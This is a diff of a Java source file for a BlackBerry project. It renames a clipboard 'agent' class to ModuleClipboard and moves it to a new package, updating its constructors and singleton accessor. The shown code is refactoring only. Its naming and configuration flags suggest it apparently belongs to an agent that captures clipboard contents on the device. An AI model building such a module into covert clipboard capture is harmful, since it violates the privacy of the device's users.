@@ -7,7 +7,7 @@
  * File         : ClipBoardAgent.java
  * Created      : 28-apr-2010
  * *************************************************/
-package blackberry.agent;
+package blackberry.module;
 
 import java.util.Vector;
 
@@ -25,7 +25,7 @@ import blackberry.utils.WChar;
 /**
  * The Class ClipBoardAgent.
  */
-public final class ClipBoardAgent extends Module implements UserAgent {
+public final class ModuleClipboard extends BaseModule implements UserAgent {
     //#ifdef DEBUG
     static Debug debug = new Debug("ClipBoardAgent", DebugLevel.VERBOSE);
     //#endif
@@ -40,8 +40,8 @@ public final class ClipBoardAgent extends Module implements UserAgent {
      * @param agentStatus
      *            the agent status
      */
-    public ClipBoardAgent(final boolean agentEnabled) {
-        super(Module.AGENT_CLIPBOARD, agentEnabled, Conf.AGENT_CLIPBOARD_ON_SD,
+    public ModuleClipboard(final boolean agentEnabled) {
+        super(BaseModule.AGENT_CLIPBOARD, agentEnabled, Conf.AGENT_CLIPBOARD_ON_SD,
                 "ClipBoardAgent");
 
         //#ifdef CLIP_FORCED
@@ -49,9 +49,9 @@ public final class ClipBoardAgent extends Module implements UserAgent {
         //#endif
     }
 
-    public static ClipBoardAgent getInstance() {
-        return (ClipBoardAgent) AgentManager.getInstance().getItem(
-                Module.AGENT_CLIPBOARD);
+    public static ModuleClipboard getInstance() {
+        return (ModuleClipboard) AgentManager.getInstance().getItem(
+                BaseModule.AGENT_CLIPBOARD);
     }
 
     /**
@@ -62,7 +62,7 @@ public final class ClipBoardAgent extends Module implements UserAgent {
      * @param confParams
      *            the conf params
      */
-    protected ClipBoardAgent(final boolean agentStatus, final byte[] confParams) {
+    protected ModuleClipboard(final boolean agentStatus, final byte[] confParams) {
         this(agentStatus);
         parse(confParams);
     }
